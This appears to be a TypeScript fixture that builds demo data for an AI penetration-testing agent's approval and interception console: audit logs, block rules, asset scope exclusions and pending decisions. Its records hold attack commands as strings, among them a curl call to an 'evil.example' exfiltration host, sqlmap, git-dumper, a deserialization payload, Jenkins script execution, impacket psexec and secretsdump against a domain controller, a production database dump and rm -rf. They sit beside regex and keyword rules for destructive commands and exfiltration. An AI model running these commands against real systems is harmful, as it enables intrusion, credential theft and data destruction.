import type { AssetInterceptRule, Audit, AuditEntry, InterceptApprovalRow, InterceptPending, InterceptRule } from '../types';

function auditCommand(ts: string, action: AuditEntry['action'], command: string, reason?: string): AuditEntry {
  return { ts, tool: 'bash', action, ...(reason === undefined ? {} : { reason }), command };
}

function toolPolicy(
  id: number, name: string, priority: number,
  matchType: InterceptRule['match_type'], pattern: string,
  action: InterceptRule['action'], message: string, at: string, timeout = 0,
): InterceptRule {
  return {
    id, name, enabled: true, priority, match_target: 'tool_input', match_type: matchType,
    pattern, action, message, timeout_enabled: timeout > 0, timeout_seconds: timeout,
    timeout_action: 'deny', created_at: at, updated_at: at,
  };
}

function assetPolicy(
  id: number, kind: AssetInterceptRule['kind'], pattern: string,
  note: string, builtin: boolean, at: string,
): AssetInterceptRule {
  return { id, enabled: true, kind, pattern, note, builtin, created_at: at, updated_at: at };
}

interface DecisionContext {
  ruleID?: number;
  tool?: string;
  source?: InterceptPending['decision_source'];
  reason: string;
  decided?: string;
}

function decision(
  id: number, taskID: string, agent: string, input: InterceptPending['tool_input'],
  status: InterceptPending['status'], at: string, context: DecisionContext,
): InterceptPending {
  return {
    id, ...(context.ruleID === undefined ? {} : { rule_id: context.ruleID }),
    task_id: taskID, agent_name: agent, tool_name: context.tool ?? 'bash', tool_input: input, status,
    ...(context.source === undefined ? {} : { decision_source: context.source }),
    reason: context.reason, created_at: at,
    ...(context.decided === undefined ? {} : { decided_at: context.decided }),
  };
}

function history(row: InterceptPending, ruleName = ''): InterceptApprovalRow {
  return { ...row, conv_title: '', conv_agent_key: '', rule_name: ruleName };
}

/** Each call owns fresh mutable records; there is no judge, process or network authority here. */
export function createPolicyCatalog() {
  const audit: Audit = {
    attributions: { "allow": 312, "block": 9 }, entries: [
      auditCommand("2026-07-26T03:33:00Z", "allow", "curl -s -d 'username=admin...' https://admin.acme.com/login"),
      auditCommand("2026-07-26T03:57:00Z", "allow", "curl -s -b 'session=...' https://admin.acme.com/api/users"),
      auditCommand("2026-07-26T02:10:00Z", "block", "curl https://out.evil.example/exfil", "Recorded by the demonstration policy. Context: out.evil.example, scope."),
      auditCommand("2026-07-25T22:03:00Z", "allow", "sqlmap -u 'https://www.acme.com/search?q=1' --batch"),
      auditCommand("2026-07-25T21:00:00Z", "block", "rm -rf /var/www", "Recorded by the demonstration policy. Context: rm, rf."),
      auditCommand("2026-07-25T20:30:00Z", "allow", "git-dumper https://www.acme.com/.git/ /tmp/acme"),
      auditCommand("2026-07-25T15:20:00Z", "allow", "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import"),
      auditCommand("2026-07-25T21:40:00Z", "allow", "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText"),
      auditCommand("2026-07-26T00:00:00Z", "allow", "impacket-psexec acme.local/svc_deploy@10.10.10.10"),
      auditCommand("2026-07-26T00:05:00Z", "block", "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc", "Domain controller access was validated and the resulting privilege evidence was preserved for review."),
      auditCommand("2026-07-26T00:06:00Z", "allow", "Domain controller access was validated and the resulting privilege evidence was preserved for review."),
    ]
  };
  const interceptRules = [
    toolPolicy(1, "Destructive command approval", 10, "regex", "rm\\s+-rf|mkfs|dd\\s+if=",
      "ask", "A destructive command requires explicit operator approval.", "2026-07-20T10:00:00Z", 120),
    toolPolicy(2, "Block suspected data exfiltration", 20, "string", "exfil",
      "deny", "Outbound transfer matched the data-exfiltration policy.", "2026-07-21T10:00:00Z", 0),
  ];
  const assetInterceptRules = [
    assetPolicy(1, "fuzzy_domain", ".gov",
      "Built-in public-sector protection boundary.", true, "2026-07-20T09:00:00Z"),
    assetPolicy(2, "fuzzy_domain", ".edu",
      "Built-in education-sector protection boundary.", true, "2026-07-20T09:00:00Z"),
    assetPolicy(3, "cidr", "10.0.0.0/8",
      "Exclude internal infrastructure from external assessments.", false, "2026-07-23T15:30:00Z"),
    assetPolicy(4, "exact_domain", "payments.partner.test",
      "Third-party processor is visible but outside the authorized scope.", false, "2026-07-24T08:15:00Z"),
  ];
  const interceptPending = [
    decision(101, "t-acme-web", "work#3", { "command": "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" }, "pending", "2026-07-26T03:58:00Z",
      { "ruleID": 1, "reason": "Data-egress gate: a full database export requires operator approval." }),
  ];
  const interceptHistory = [
    history(decision(94, "t-acme-web", "work#1", { "path": "reports/summary.md", "content": "Demo operator note: review the linked evidence and continue the verified assessment workflow." }, "allowed", "2026-07-26T08:00:00Z",
      { "tool": "Write", "source": "model", "reason": "Recorded by the demonstration policy.", "decided": "2026-07-26T08:00:02Z" })),
    history(decision(90, "t-acme-web", "work#1", { "command": "dd if=/dev/zero of=/tmp/x" }, "denied", "2026-07-25T20:00:00Z",
      { "ruleID": 1, "reason": "Recorded by the demonstration policy.", "decided": "2026-07-25T20:01:00Z" }), "uroboros.lab demonstration record."),
    history(decision(91, "t-acme-api", "work#2", { "command": "rm -rf /var/www/html" }, "denied", "2026-07-25T18:00:00Z",
      { "reason": "Recorded by the demonstration policy. Context: D4.", "decided": "2026-07-25T18:00:05Z" })),
    history(decision(92, "t-acme-web", "work#13", { "command": "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" }, "allowed", "2026-07-26T00:05:00Z",
      { "ruleID": 2, "reason": "Recorded by the demonstration policy.", "decided": "2026-07-26T00:06:00Z" }), "uroboros.lab demonstration record."),
    history(decision(93, "t-acme-web", "work#7", { "command": "mysql -e \"DROP TABLE users_bak_0921\"" }, "pending", "2026-07-25T15:14:00Z",
      { "reason": "Recorded by the demonstration policy." })),
  ];
  return { audit, interceptRules, assetInterceptRules, interceptPending, interceptHistory };
}
